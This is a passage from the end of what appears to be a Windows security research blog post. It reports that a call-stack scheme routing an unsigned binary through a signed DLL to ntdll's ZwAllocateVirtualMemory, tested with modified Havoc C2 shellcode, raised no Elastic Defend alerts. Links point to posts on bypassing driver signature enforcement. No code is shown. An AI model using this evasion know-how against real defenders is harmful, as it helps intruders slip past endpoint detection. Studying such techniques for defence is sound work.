src="https://blog.cryptoplague.net/main/~gitbook/image?url=https%3A%2F%2F750590561-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FqEHYs3J0lebZbZucvZkw%252Fuploads%252FPuOhSu4X4h1c621vxH41%252Fimage.png%3Falt%3Dmedia%26token%3Dd825ee19-7d35-400a-a38e-7863e4498ddc&amp;width=768&amp;dpr=3&amp;quality=100&amp;sign=de3261f9&amp;sv=2" width="510" height="219"></div></div></div></div><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Which roughly equals to the following scheme, as expected:</p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start"><span class="text-blue-500 contrast-more:text-blue-800">unsigned_binary -&gt; signed_dll_offset -&gt; signed_ntdll_ZwAllocateVirtualMemory</span></p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start"><strong class="font-bold">Final Test</strong></p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">After testing this with an actual loader and modified <a class="underline decoration-[max(0.07em,1px)] underline-offset-2 links-accent:underline-offset-4 links-default:decoration-primary/6 links-default:text-primary-subtle hover:links-default:text-primary-strong contrast-more:links-default:text-primary contrast-more:hover:links-default:text-primary-strong links-accent:decoration-primary-subtle hover:links-accent:decoration-[3px] hover:links-accent:[text-decoration-skip-ink:none] transition-all duration-100" data-state="closed" href="https://github.com/HavocFramework/Havoc">Havoc<svg class="gb-icon ml-0.5 inline size-3 links-accent:text-tint-subtle"><title>arrow-up-right</title><defs><mask id="_R_4qv8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/arrow-up-right.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_4qv8qav5ukqiv5ubsnpfivb_)"></rect></svg></a> (Demon agent shellcode) as our C2 of choice, Elastic Defend did not generate any alerts.</p></div><div class="flex flex-col md:flex-row mt-6 gap-2 max-w-3xl page-width-wide:max-w-screen-2xl mx-auto text-tint"><a class="group text-sm p-2.5 flex gap-4 flex-1 flex-row-reverse items-center pl-4 border border-tint-subtle rounded-sm circular-corners:rounded-2xl straight-corners:rounded-none hover:border-primary text-pretty md:p-4 md:text-base" href="https://blog.cryptoplague.net/main/research/windows-research/the-dusk-of-g_cioptions-circumventing-dse-with-vbs-enabled"><span class="flex flex-col flex-1 text-right"><span class="text-xs">Previous</span><span class="text-tint-strong group-hover:text-primary line-clamp-2">The dusk of g_CiOptions: circumventing DSE with VBS enabled</span></span><svg class="gb-icon hidden size-4 text-tint-subtle contrast-more:text-tint-strong group-hover:text-primary md:block"><title>chevron-left</title><defs><mask id="_R_4qqav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-left.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_4qqav5ukqiv5ubsnpfivb_)"></rect></svg></a><a class="group text-sm p-2.5 flex gap-4 flex-1 flex-row items-center pr-4 border border-tint-subtle rounded-sm circular-corners:rounded-2xl straight-corners:rounded-none hover:border-primary text-pretty md:p-4 md:text-base" href="https://blog.cryptoplague.net/main/research/windows-research/offset-free-dse-bypass-across-windows-11-and-10-utilising-ntkrnlmp.pdb"><span class="flex flex-col flex-1"><span class="text-xs">Next</span><span class="text-tint-strong group-hover:text-primary line-clamp-2">Offset-free DSE bypass across Windows 11 &amp; 10: utilising ntkrnlmp.pdb</span></span><svg class="gb-icon hidden size-4 text-tint-subtle contrast-more:text-tint-strong group-hover:text-primary md:block"><title>chevron-right</title><defs><mask id="_R_5aqav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-right.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_5aqav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="mx-auto mt-6 page-api-block:ml-0 flex max-w-3xl page-full-width:max-w-screen-2xl flex-row flex-wrap items-center gap-4 text-tint contrast-more:text-tint-strong"><p class="mr-auto text-sm ">Last updated <time data-visual-test="transparent" datetime="2024-09-26T18:25:29.898Z" data-state="closed">1 year ago</time></p></div></main></div></div><!--$--><!--/$--></div></div></body></html>